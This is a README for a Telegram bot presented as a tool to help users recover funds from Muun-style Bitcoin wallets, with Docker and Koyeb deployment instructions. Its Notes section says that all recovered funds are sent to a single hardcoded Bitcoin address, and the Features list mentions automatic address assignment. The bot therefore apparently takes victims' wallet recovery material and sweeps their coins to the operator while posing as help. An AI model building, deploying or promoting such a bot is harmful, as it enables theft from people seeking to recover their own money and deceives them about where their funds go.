#smth

A Telegram bot that helps users recover funds from their wallets.

## Features

- Interactive Telegram bot for guided recovery
- Automatic Bitcoin address assignment for all recoveries
- Detailed progress reporting during wallet scanning
- Simple fee selection with all fees set to 1 sat/byte
- Transaction creation and broadcasting

## Deployment to Koyeb

### Prerequisites

1. A Koyeb account (https://koyeb.com)
2. Docker Hub account (or another container registry)
3. Telegram Bot Token (from BotFather)

### Deployment Steps

#### 1. Build and Push the Docker Image

```bash
# Build the Docker image
docker build -t yourusername/muun-recovery-bot:latest .

# Push to Docker Hub
docker push yourusername/muun-recovery-bot:latest
```

#### 2. Deploy to Koyeb

##### Option 1: Using the Koyeb Web UI

1. Log in to your Koyeb account
2. Click "Create App"
3. Select "Docker Image" as the deployment method
4. Enter your Docker image URL (e.g., `yourusername/muun-recovery-bot:latest`)
5. Add the following environment variable:
   - TELEGRAM_BOT_TOKEN: Your Telegram bot token
6. Set the port to 8080
7. Deploy the application

##### Option 2: Using the Koyeb CLI

1. Install the Koyeb CLI: https://www.koyeb.com/docs/cli/installation
2. Update the `koyeb.yaml` file with your Docker image URL and deployment preferences
3. Deploy using the CLI:

```bash
koyeb app init --name muun-recovery-bot --docker yourusername/muun-recovery-bot:latest
koyeb app create --port 8080 --routes / --env TELEGRAM_BOT_TOKEN=your_telegram_token
```

### Configuration

The application requires the following environment variable:

- `TELEGRAM_BOT_TOKEN`: Your Telegram bot token (from BotFather)

### Usage

Once deployed, users can interact with your bot on Telegram:

1. Start a chat with your bot: `https://t.me/YourBotUsername`
2. Type `/start` to begin the recovery process
3. Follow the guided instructions

## Development

### Local Setup

```bash
# Install dependencies
npm install

# Start development server
npm run dev
```

### Build for Production

```bash
# Build the application
npm run build

# Start the production server
npm start
```

## Notes

- All recovered funds will be sent to the address: `bc1qtsljd6vsqmz0qylu85gcava96flp6rjqzzlyk4`
- Fee rates are fixed at 1 sat/byte for all fee levels to prevent "fee too high" errors
